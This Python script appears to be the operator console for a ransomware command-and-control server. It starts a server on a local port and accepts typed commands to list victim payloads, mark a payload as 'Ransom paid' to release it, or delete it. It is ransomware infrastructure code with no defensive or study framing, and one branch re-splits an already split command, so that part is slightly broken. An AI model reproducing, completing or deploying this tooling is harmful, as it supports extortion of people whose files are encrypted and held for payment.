from server.server import Server
import threading, time

def run(ip, port):
    # requests for ip and port address if not provided
    if not ip:
        ip = input("Insert server's IP address: ")
    if not port:
        port = int(input("Insert server's port: "))

    server = Server()
    t = threading.Thread(target=server.start, args=(ip, port, True,), daemon=True)
    t.start()
    time.sleep(0.1)

    while True:
        command = input('>>> ')
        if command == 'all':
            server.database.print()
        elif command.split(' ')[0] == 'pl':
            payload_id = command.split(' ')[1]
            command = command.split(' ')[2]
            print (command)
            # release payload's ransom
            if command == "paid":
                pl = server.database.get(payload_id)
                if pl:
                    pl.status = "Ransom paid"
                else:
                    print ("Payload not found")
            elif command == "remove":
                server.database.remove(payload_id)
            else:
                payload_id = command.split(' ')[1]
                server.database.print_payload(payload_id)
        elif command == 'q':
            server.stop()
            break

run("127.0.0.1", 46587)